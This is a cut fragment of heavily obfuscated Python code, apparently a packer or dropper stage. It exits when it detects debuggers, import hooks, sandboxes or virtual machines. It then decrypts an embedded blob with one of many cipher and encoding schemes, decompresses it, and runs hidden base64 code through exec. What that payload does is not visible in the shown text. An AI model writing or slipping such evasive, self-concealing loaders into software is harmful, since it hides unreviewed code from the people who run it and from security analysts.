    _gqcaa = bytes.fromhex("461e4f7b5f42736369536d685d46691c416d786d4c62531c4a69657d71606c7c53405f6a67125961621c68645d44735a6d69531d71646172471271676e6e134d4a496f4c1213517d53437c5f42534f62651f4719595c58517263451866677f53606773436f4a1b7b5d45466f7e524459697d737e6813445b495f46681d186e7b471c651a5979635b514a44695c6e72495b1d4e6060686e1c785d62444a535a5b631e18691f68535d6c5f5840185d7d1d7a1848441b4a7d1d59474e7d6d5e5d5a667f4e464c7c196653416871607a67607b184c5e42726e5e526266606c6567417e4f4e781e5c737b7d1f1c7e7b696c645b794d641e1c41686871197f526d7b7c426962136d514c45517f4f436c687b7c46597a7c645a415f497d4c51405b7c4372134a1d63716d631b7f737a197e67681c624c1e7d4e46485b49404551626252626765515e726d635f694a78645d675d5d7b656d42664a614449674d6a1b67657d7d61795d131b486663644e424f1c455213455f18471e6f637a426472486c5b7e1e4561595d1b5c1b5152661343721e4d44525a4d7a424f1c47471d1e6f6f7f5b614c4c6061461b40135b4e69677e657a5c72444151711d78456a7d47731b4a5871421e5b1f52494e41666a694246615c6978594d1c796c6e491f6f5e4a69516f7b6c4e5a631a1f45134e465144651e791b586e62531d49124c7d125b1c61137b5e5b611c6a1d1b476d5c1d4f1e484c661a736f6f4f781a4169736e7c1d1d4c537b426548591d6f63454c1b464e454d53654f7a5b4d6a535d68604a656e7f1f191d635c6c1e5e4d1272626a736d1e6c584a4068417c47691a695849446f446e43435d1f684e1c517d72461a6761585b1d1a497c5f4547711e45727d66594d697b1a1f511b7e476c4c7b6673531b5c7e7f48447e51684c725258406e6671474f6a484f47426d596e6859477879727d641b694d1c6313667a4f604a1f1f7d611b65726119514c7d4e1e4d5361644f1f625d7352644f4764664f4f7e7d195a781d5c4e5d7e6e44794e5e1f615a6c5e13491f191d535b1e6964601e1b4045405c5968416741131c69696119186f5a5a1f491c7a424e4445517d457a5b127c4e1f647c736d635e4d6e51727a425d59441b637d1c714c73627d7e51525c6e5d7c585965441c584a636643731f4218454749455a73597b5b6d494d5c675f52651c485a484a714f42594d671b1a791319121b6c64444d531245591f6d5160625c5a184c58737a4d4a181c1a517f1a51716e636e121c514e1341196a5e696e7d61125a79711f5a404d5f5d697c5a635c5c4d59197e491a5840136c7f7f59636e1b5a5b691a4953654c49137f684a1d421a474d124f7a7f191f1b6a7c4c46697a404c651e4949696043127e586c6e415f1b5e6d511a4943797b6a6d64731d795a6f7e6041")
    _gqcaa = bytes(_ ^ 43 for _ in _gqcaa).decode()
    _lwebje.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _lwebje.modules:
            _lwebje.stderr.write('error: debugger detected\n'); _lwebje.exit(1)
    _hxydw = _dnsvivj.b64decode(_zmkyjfcx)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_lwebje.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _lwebje.stderr.write('error: hook detected\n'); _lwebje.exit(1)
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher as _byumugsj, algorithms as _xjkjxkkf, modes as _lsrnyzn
    except ImportError:
        _lwebje.stderr.write("error: cryptography not installed\n"); _lwebje.exit(1)

    if len(_lwebje.meta_path) > 5:
        _lwebje.stderr.write('error: import hook detected\n'); _lwebje.exit(1)
    if getattr(_lwebje, 'flags', None) and _lwebje.flags.no_user_site:
        _lwebje.stderr.write('error: sandbox detected\n'); _lwebje.exit(1)
    import os
    if any(x in str(_lwebje.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _lwebje.stderr.write('error: virtual machine detected\n'); _lwebje.exit(1)
    if _zhuirfh == 6:
        _pdamm = _dnsvivj.b64decode(_hxydw)
    elif _zhuirfh == 2:
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _lbsejz = _hxydw[16:-32]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=80)
        _kabtimxpv = _gemnnc[:32]; _qnozmsrdz = _gemnnc[32:48]; _whmmnsac = _gemnnc[48:80]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _lbsejz, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        _ivuvlwkd = _byumugsj(_xjkjxkkf.AES(_kabtimxpv), _lsrnyzn.CTR(_qnozmsrdz))
        _pdamm = _ivuvlwkd.decryptor().update(_lbsejz)
    elif _zhuirfh == 5:
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _lbsejz = _hxydw[16:-32]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=64)
        _kabtimxpv = _gemnnc[:32]; _whmmnsac = _gemnnc[32:64]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _lbsejz, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        _pdamm = bytes(_lbsejz[i] ^ _kabtimxpv[i % 32] for i in range(len(_lbsejz)))
    elif _zhuirfh == 1:
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _lbsejz = _hxydw[16:-32]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=80)
        _kabtimxpv = _gemnnc[:32]; _qnozmsrdz = _gemnnc[32:48]; _whmmnsac = _gemnnc[48:80]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _lbsejz, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        _ivuvlwkd = _byumugsj(_xjkjxkkf.AES(_kabtimxpv), _lsrnyzn.CBC(_qnozmsrdz))
        _pdamm = _ivuvlwkd.decryptor()
        _pdamm = _pdamm.update(_lbsejz) + _pdamm.finalize()
        _azgbbn = _pdamm[-1]
        if _azgbbn < 1 or _azgbbn > 16 or not all(_ == _azgbbn for _ in _pdamm[-_azgbbn:]):
            _lwebje.stderr.write("error: decryption failed\n"); _lwebje.exit(1)
        _pdamm = _pdamm[:-_azgbbn]
    elif _zhuirfh == 0:
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _lbsejz = _hxydw[16:-32]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=64)
        _kabtimxpv = _gemnnc[:32]; _whmmnsac = _gemnnc[32:64]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _lbsejz, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        _ivuvlwkd = _byumugsj(_xjkjxkkf.AES(_kabtimxpv), _lsrnyzn.ECB())
        _pdamm = _ivuvlwkd.decryptor()
        _pdamm = _pdamm.update(_lbsejz) + _pdamm.finalize()
        _azgbbn = _pdamm[-1]
        if _azgbbn < 1 or _azgbbn > 16 or not all(_ == _azgbbn for _ in _pdamm[-_azgbbn:]):
            _lwebje.stderr.write("error: decryption failed\n"); _lwebje.exit(1)
        _pdamm = _pdamm[:-_azgbbn]
    elif _zhuirfh == 8:
        _ylwedf = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _aqmlpxvui = {c:i for i,c in enumerate(_ylwedf)}
        def _ozvnblh(_pfete):
            _rrdxxl = bytearray(); _zdmltj = 0
            while _zdmltj < len(_pfete):
                _purevmtyx = 0; _aphhinqbe = 0
                while _zdmltj < len(_pfete) and _aphhinqbe < 5:
                    _purevmtyx = _purevmtyx * 85 + _aqmlpxvui[chr(_pfete[_zdmltj])]; _zdmltj += 1; _aphhinqbe += 1
                _ydiydml = _aphhinqbe - 1
                if _ydiydml > 0: _rrdxxl.extend(_purevmtyx.to_bytes(4, 'big')[4-_ydiydml:])
            return bytes(_rrdxxl)
        _pdamm = _ozvnblh(_hxydw)
    elif _zhuirfh == 10:
        _pdamm = bytes.fromhex(_hxydw.decode('ascii'))
    elif _zhuirfh == 9:
        def _fwyuqp(_mctmbtnsc):
            if _mctmbtnsc[:2] == b'<~': _mctmbtnsc = _mctmbtnsc[2:]
            if _mctmbtnsc[-2:] == b'~>': _mctmbtnsc = _mctmbtnsc[:-2]
            _apobwjcz = bytearray(); _acenulk = 0
            while _acenulk < len(_mctmbtnsc):
                if _mctmbtnsc[_acenulk] == 122:
                    _apobwjcz.extend(b'\x00\x00\x00\x00'); _acenulk += 1; continue
                _hciiqmbdq = 0; _sizojpe = 0
                while _acenulk < len(_mctmbtnsc) and _sizojpe < 5:
                    _hciiqmbdq = _hciiqmbdq * 85 + (_mctmbtnsc[_acenulk] - 33); _acenulk += 1; _sizojpe += 1
                _nnqmhtr = _sizojpe - 1
                if _nnqmhtr > 0: _apobwjcz.extend(_hciiqmbdq.to_bytes(4, 'big')[4-_nnqmhtr:])
            return bytes(_apobwjcz)
        _pdamm = _fwyuqp(_hxydw)
    elif _zhuirfh == 7:
        _pdamm = _dnsvivj.b32decode(_hxydw)
    elif _zhuirfh == 12:
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _lbsejz = _hxydw[16:-32]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=64)
        _kabtimxpv = _gemnnc[:32]; _whmmnsac = _gemnnc[32:64]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _lbsejz, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        _azgbbn = 3 + (_hfief[0] & 7)
        _hfief = bytearray(_lbsejz)
        for _zeycbz in range(_azgbbn - 1, -1, -1):
            _qylhczu = (3 + _zeycbz) & 7
            _glysegvp = (_zeycbz * 0x1B + 0x5A) & 0xFF
            for _qnozmsrdz in range(len(_hfief)):
                _azgbbn = _hfief[_qnozmsrdz]
                _azgbbn ^= _glysegvp
                _azgbbn = ((_azgbbn >> _qylhczu) | ((_azgbbn << (8 - _qylhczu)) & 0xFF))
                _azgbbn ^= _kabtimxpv[(_zeycbz * len(_hfief) + _qnozmsrdz) % len(_kabtimxpv)]
                _hfief[_qnozmsrdz] = _azgbbn
        _pdamm = bytes(_hfief)
    elif _zhuirfh == 4:
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _lbsejz = _hxydw[16:-32]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=80)
        _kabtimxpv = _gemnnc[:32]; _qnozmsrdz = _gemnnc[32:48]; _whmmnsac = _gemnnc[48:80]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _lbsejz, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        _ivuvlwkd = _byumugsj(_xjkjxkkf.ChaCha20(_kabtimxpv, _qnozmsrdz), mode=None)
        _pdamm = _ivuvlwkd.decryptor().update(_lbsejz)
    elif _zhuirfh == 3:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _agiarxpeb
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _pdamm = _hxydw[16:-32]
        _lbsejz = _pdamm[:-16]; _azgbbn = _pdamm[-16:]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=76)
        _kabtimxpv = _gemnnc[:32]; _qnozmsrdz = _gemnnc[32:44]; _whmmnsac = _gemnnc[44:76]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _pdamm, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        _pdamm = _agiarxpeb(_kabtimxpv).decrypt(_qnozmsrdz, _lbsejz + _azgbbn, None)
    elif _zhuirfh == 13:
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _lbsejz = _hxydw[16:-32]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=80)
        _kabtimxpv = _gemnnc[:32]; _qnozmsrdz = _gemnnc[32:48]; _whmmnsac = _gemnnc[48:80]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _lbsejz, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        import struct as _lbrqroi
        def _qylhczu(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_lbrqroi.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_lbrqroi.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_lbrqroi.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _zeycbz = _lbrqroi.unpack('<I',_qnozmsrdz[:4])[0]
        _qnozmsrdz = _qnozmsrdz[4:]
        _hfief = bytearray()
        while len(_hfief) < len(_lbsejz):
            _azgbbn = _qylhczu(_kabtimxpv, _zeycbz, _qnozmsrdz)
            for _glysegvp in range(min(64, len(_lbsejz) - len(_hfief))):
                _hfief.append(_lbsejz[len(_hfief)] ^ _azgbbn[_glysegvp])
            _zeycbz += 1
        _pdamm = bytes(_hfief)
    elif _zhuirfh == 11:
        _hfief = _hxydw[:16]; _ppfsrhb = _hxydw[-32:]; _lbsejz = _hxydw[16:-32]
        _gemnnc = _rklap.pbkdf2_hmac('sha256', _gqcaa.encode(), _hfief, 100000, dklen=64)
        _kabtimxpv = _gemnnc[:32]; _whmmnsac = _gemnnc[32:64]
        _cxrfalnmk = _ikrsgsxv.new(_whmmnsac, _lbsejz, digestmod='sha256').digest()
        if not _ikrsgsxv.compare_digest(_ppfsrhb, _cxrfalnmk):
            _lwebje.stderr.write("error: integrity check failed\n"); _lwebje.exit(1)
        _azgbbn = _kabtimxpv[0]
        _pdamm = bytearray()
        for _zeycbz in range(len(_lbsejz)):
            _hfief = _lbsejz[_zeycbz] ^ _azgbbn
            _pdamm.append(_hfief)
            _azgbbn = _lbsejz[_zeycbz] ^ _kabtimxpv[ (_zeycbz + 1) % len(_kabtimxpv) ]
            _azgbbn = (((_azgbbn << 3) & 0xFF) | (_azgbbn >> 5)) ^ 0x5A
        _pdamm = bytes(_pdamm)
    else:
        _lwebje.stderr.write("error: unsupported algorithm\n"); _lwebje.exit(1)
    _vk = bytes.fromhex("d39e0d52b4df0abee4254c0d8101c3015d4fc38651da52c46edede4037c20d34")
    _vn = bytes.fromhex("889cbfcf7b820a973854a41f79a0f663")
    _sig = _pdamm[-32:]
    _pl = _pdamm[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _lwebje.stderr.write('error: VM integrity check failed\n'); _lwebje.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _pdamm[1] == 1:
        import zlib as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 2:
        import lzma as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 3:
        import bz2 as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 4:
        import brotli as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 5:
        import zstandard as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 6:
        import gzip as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 7:
        import lz4.frame as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 8:
        import snappy as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 9:
        import gzip as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    elif _pdamm[1] == 10:
        import blosc as _kwevyuzgg
        _pd = _kwevyuzgg.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_dnsvivj.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCcyMVdQVHBTV2NhR1hlb3N2cHFIOWVDYTBPMUphRFJ5T1c5cUlrckdUcHRJPScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgnMFN2alpiWkpMeDhBM0Q5TkNYcW5qWHNOQkNIYlZYK1VlYThESWFVamV2cnFKNUV6LzZZUXdnYUVHWDFmRUVVcHkyalROU0lMR3IvWVZQd05OV2o1YTlwNllOUWpOcHhNbVRTS2FaMkQ5V0x6Y1d6OUVtOFowZTRkZ1lHdXp4YnJub3VqREtlbDlzeGswaldUeFpBdXN3VTZheHZGMnNJZHNtVnhVaVMycjE3dXBjZllNd2lTL09ZdXJZdmlLRUQ1eXhJNjA0K0g2NXA4QXNUSkZUQ1lmQ24wcnFnU3MydWptNmlRa2JHRVd5TmxvbDhFWkJNQVVsbVc2NUtrMmJIanYxSlFUeHhKZGhlcGJiaFVzdmRXVDlkaFVsaVFnNWZxYU1Dbi9KN2R0NkxLTzE2T0ZUb0hzbU5rZUE9PScpLCBiYXNlNjQuYjY0ZGVjb2RlKCdSTnRtY2ZWaE9iR3oxZFBoZGZ5LzFnamk3c05FV3JjWnRKVXRqbkdjWUxNdi9VOG1xeXNUZ0pYTzhOSlM5c29PdVIrMVRSRTdWT05TQVJSRXNKUS8yczR1cTlOeUJnVmVvWGt3YlhrM2xobmdrN1RGaGt5aTdhakt6eXFkRHJIYWRoSktNNUJ5MlV0aUtpa3NYc2JqemN1Nm9DUmJ6NWFDem1RZ2VORU1PTHN0NVZuL1ZzSDZ6c0VWVFAzVm5WNWs0bThqUytaL0hZeFpXbFNvY0NDVDhGQUk3cEwyQVh6LzJDQW5vaWZoaEkwa2RTYjZwdFZSWDhUNTVCNHJ3ZFJxclkxYnk3MERQcHNrVFhROCtmQnI1RGt4TXhSTmF6alAvNkE2YUprUycpLCBiYXNlNjQuYjY0ZGVjb2RlKCdib252OUE0WFBQdGlBVWZPSnZSUVo1RFpSUVpYa3BPVXZ6SXZjQ1V6dy95T0ViTHJjR3NTcUJydnkwelMxYisxanMySDZLcWlOaEhsZXowR0RDeUFIdnQ3YXd4ZXd4d1E2ekhnTVpuWXZTNEpoVE9mY3h3dTNOdUphWEMzbmV1ZnhvT1BwN2hnMTM1S20rd0Z5OTRyWERKQUMvS3ZTUGV4c1k1VFNTRU9pb0ZLOHdtWDRiWGZGdDhmNkdXVUdDZ1pBeXkvVnBHQ0VpWjVjajZVUVNjamhHcHQvWUJMOXhHSTdlVG1IMW5vTGNNTFlaUWNlVUg3Y214TUVNYmNQQjZxMlZZazVKanptNTBhVjZoSE9XekxtUit0K2NydTV3Ris1Uk9TSEI3YU5XZVJZN3M9JyksIGJhc2U2NC5iNjRkZWNvZGUoJ3JOWkk5Y2ZYVndRdDB5eDY0Q1RKS21wOXE2T2ZLSzJGZDY5Z0FRTTFMb094Y0hsc2hXOHVBbml0eHUvOU9qZ20zRkJWOEd2aktwOWZSYWlBRUlRMDljKzRtVWwya0ZnbmluWU5MRVMxMVkxUFRKUzR4SUhCTHYvK0lMcGhxbHBGZlI4SFhnSVY0YTlIOHoxNTk5Wm90VXg3TGR0VUN5NVdEaE5JNkVJN0hsT2c3UFBFa1h3NVVzOXlmWVZHMXNZVXlNdlBMa3lta2hHWTNlYllPSXEveTAxM254Ti9iQVZ5YjVoSGZsUzJsS3krTitsZnljd1RSZFZLeEErRm51cmZndU11WWswejB1UTlFOFlvVzYySmhDKyt2T3RpQzRBOHp1VkpQUVRpOVd2dG1ZQ0tNdHI3RDRPenVQRmlobzRub3JDd1U0S1E0Z0RpRG51b05PWGI1OFJWVlhxVGhSR3d5SUk0S2hUVTBvNitsVzJhOW1HODhrdXVGODMyandxRFhleWhuMmhPVzdNeDVYUzI2NThnbk00QkZ5U1dlV2tEVnRlZVJsVnhUOXZxSkRkZ3pzQmg0NE8vZkt6SkJtUEQwQnQ1YWtucCtDelQvN0VZTTVxREM1aFlkOW05QkpVaUptN2UvckUzRVVVVkZ4aEwvUHZPS1hHVDVYMDFuUVNSZG5yWFJsdm54cytRRmRiTkZ0TUtrR3oxM01GNmx0RTRjUFp2ZkZDTmNnUTl5NkhUcFVTV2EzT3VTTDV2OVRhb2hkSDhCYVFXbmV0RHlkK1VwdFJMdktlbm1YLzRVampJN3g0QUdzZUxrT0N3UnVUa3BlTm1TUHNWYXMrdFJsSm5qdDZpQ1NEMkdTWDJlNTczTDZBeStGTkgvOFJtWHBjS0RXeEJsQjJsSlQ2dXNPZDEvcFdObnNpc1dYUk9mZDUxYU12YnVrTWFBcXZXUXpKMGkvM1JxL2hkZTEydFMyeWtDRE9pRllzQ3h6czg2b1k1TDRDUzRiZkxLL3JzRjBiSFVzWFdTUzRYVmNhcEsxdnoyOXBsTWxSajdnaXBscXF0bjN5THlKMU8vRjU1ang2UmRvamw0M1hkSTJmR0ZmdzNDOFF3aDUvL1pEdTIrc0RQMlJaZlZncVlJWFlGdUZSR2JzUmNvb2s2OEU5QWpxVStObDNPbzl5UTUraFNwTVZkbWtFTU1vb3VpTE1ja054clZPRU5yS3pwTWhHNUVwSlZrNlZ4NSt2VU5adDJibVBnNmtZVi9lTUcyZmMvSDVidDlna2RkMUVNT0ZQazM3Ym5NWk1nSGxqNFpFR1pacUpjWUNwOHdXSFFOV3lsM2lNMHZKVXFZc2VTSFlicUgwM0lDRHFCcDVZR25kTjRuMW9tNHI3c3Z0bTFtL3dId1hwMk9QTDBkMThDaU44RDJjbHN1aUx3VGtRSE9Oa3MyeW52REFDRDBBbjFtcEZkR1BsY2t1SUFTdGR5TWxsekRqYVF0RnpvdklsZ1ZzbTQ4NTdZVXYzblp2ckFIVTl6SzVrTlNGWTVkWlBna28wQWh4R1lvc0tqb09ic3VHMERGR0c3TUZOd1k4eWZuZDlTT0F3cVVxTW9Ib1NQZ1pMMFp1c0MxQ2hYZERSaUo5VmZTbkltOG9HbWtyT3JkdEJhVUpEaFMxVXloV2lVUU5iWm1hNG15T3VGQjBZTjk5U3U0Z3MxUGc1K1JVSDN1aUw3WW1yeEpqaDJUTTBpdG5FMnpDUWVLRlpWODRGeHM3WjJpcWJLRUMzMkpxSWpHdk00WEN5bkxWZWgvYWd3UWZwL1Qrc3p0ZlExVjVsc1ZNVVpPeXBsVTF6UkFjSTIyUTdibWlMSWlFREtIa2VaTUFPalBkSFRRaVpPWElXWDhCb0hURlpzeHAvR0x1bU0zYnR5b3BTaVJKcCtQTU0zdGJSOTNvNVJIVU1EbDUwZGVaTXdVSktmU0xFbXVzYTh6bTBhbGFnYjhEcWFlb1FTRDd1TXl3V0YzUXdZTk1JOXljVFV1czVqaHQ5dVJCNmtpaVV3SXQ5TFNQV3pwL3NGblFyQkVNTXF4RVV2Y1Y1M05JSnNwM3ZPeXJUM3VoQkdLTEdOUmlIZlpTTXp3YnJOMDlNS2R3OFNGdldMY29MMk5tOGNxbXdPa2JIdDJqVjlyY2xUUDZwbmJXWkNDMktCaEdWZW84YlVNT0dXRDJTZW5pSTVhVzhIcVdUTi9mWlNuOWc2WG1IUlZFTHhKYTROcFpzQ01heDJmb2k1MUc3RUk2VmVMWnZJY0l2ZFVyVTdzUlNvbWFxZUxqb2dOdndGdHl1MHJjNVhyTjhLUFY1SzVqQVZYdWpOSWtwTEtYVmVoMzBVVndMazQ5T2MzUEhjVVU0QTBXbGwwOFdIZHk0OFBqb3NjYWJFTlBOdVZBUTM5V0IzWG1RNmowZmJGcTBXQUw1MXh1ZjJadW5UczY4WWdra1RGTDEvTWVTRXNYVW1veGJwYUZtK0pCVUdiZTlUb09zU253TkIrbGptMmhOV0ViTG5WaVZCQUt3N1pYLzlTTm9wYlZJZGV4RlFJS2dOZmM2VHBSS1Z6bFRBRXJsdnF4M1BqclA3UUZVMW1paDViZnNBZUc2VnBqTVUxLzVoNjU0Zm9GZmZ1VHRJVnFRMUN4S3h1YzZyRDNvWnhZMVRwUGxyUWFuR1h0bHJLbFF5M3pWSldPdURkNGZlZDY1U2R3dFcwdWMxNjkzMEx4NW5VbW8zV1dhS2ZMRmJIWWxJUzdPSGlJQ1dTU3ZwaXN0emVRM2lRVjlhQjhEY2RZbUVHa0N5N2dUc0U4cVlqdFNydVYwa3oyaUllVzVtRzUzcUZDSDRBd3BPVGFEZG9XS0RHRjVZR1plR1psS0R1Y0ZhUklXNzVPL1hxQmtzTTh6Q3c0Z2dUWDVlWWpNaEJudlZtZ2ZXbGxpaTl3VnU4azJZV3h3RWFPV1QvcCttNGltNEtuSExramJyUUpKdll4M0V2anpFK0FOS0pVT3JOZkVkeW1MaE1pWlJERUd2VWJuV2wzOVlxK2VkcExrUWdjb0NSejJXQXIxTk53YVVDQ0JBaXkrK2swTjVwWVpLMlc0MVZWYjJ6eEltSWpMZktTb0JzbmRYeURKbVpGNkV1L3lxdXFvUStDMUZoVUF0a2g4dHUwc0JJMlVGMTR1RVBtRW5WcmFmWFRhK0ZlK2svbHg3T3F4TXowQzZzbDJVV1cvV3ZNZnJ5Nk1hc1VLamZ0M1QvQ0hxWDUvNjkyL3ZlQmVFd0VhVktJaGZVVFM2d1BwV0JINjY0U0RZcXlKNS9NbjgybENVYWhvd25pa2Y4ZEFUdUUvdFpkVTE0L1F2MUxSbUJ4RlA1Y1JqU0xOcFR2UFAyWnFTT3FnMFp5bTI4QWJSV0NTbUc3SUFkMWtXZ3p4T2xEU0lHV3pFOWFQNGQ3bEZIaVB3MG9VWElLTFliLzgxcTkvRXVKWEhGdXhOcTNsdDIvMkVJQUF4SU52UWRGOWRWUzRSY1dnRkQzV1lrbDhqZ3kyMm1VNGdOekZrTExBWmRvRitBK0txelRGN0szbEhiSHdsbzhuK1g5Y0J5MWhxY0ZqRVJHL2lKMHZxOEY3cUFlTy9sS2JUMHNlUmh1YXBHaXFBdXpYUEZQbDJYZDZIdHNGV0xRSUJ1VFdoUHJmREJJMW1YM0FLcEx2cEpkcWI3T2xrNHFqWEVORjIvbHFKVDRtZktncEdvOSsyZTQ1YnlsNmdXRUtOeWpOM0I3VnlOa2NiQ1VLV0Q3N2hzNHBYNjVqQkRmakNtNkMwREsxc0RHaW9UNUJIdVo5d1l3VjQ3aU9RclpnWXRUUDdDQUxvak1ucStleDZqWExxcXdFMHh3aEduMlRvREVheFVWLzh6S0piRHpRNGxqMzd1a3FUbnZweFNkaVdYbnU0cWNOeEtKeUtLVGtJWnMrUG5zTTdxT2JUZ29NTm5tUjZPdCtYWlZ0MGtNVjRkNnpWaDdydzY0cEN3ZldHS3RaVklKVEt5b0hEVFluWU51aGVSQVRFd2NrMFR6YlhFVlpnTk4wbkxNalJkdkpOYkQ1QVl2b094Tm5FQ3pyaGp0S2c0bWw5akJXZENJTC9WU2J2b1dSS3BlZGYxcHZwQjREb3VvVjdEYmpXU3UyR3luaEJJQ0VxQitJbStqdEtLc25YS3V2V3lTZXBybUxUTHdZUThBT0d0Q3F4cWtMUGJ2U2ZjZzFYVDF5WVdaZGh0by90UWlSckdkZEszdUN5MS9xVmlHS3JjUENuYWs1dk9XSkFJdlVIRGFSU3lTU3NjY1dFVTJuMnFSc1FqMnNoKzkvL0xCeDZRYjgzY05s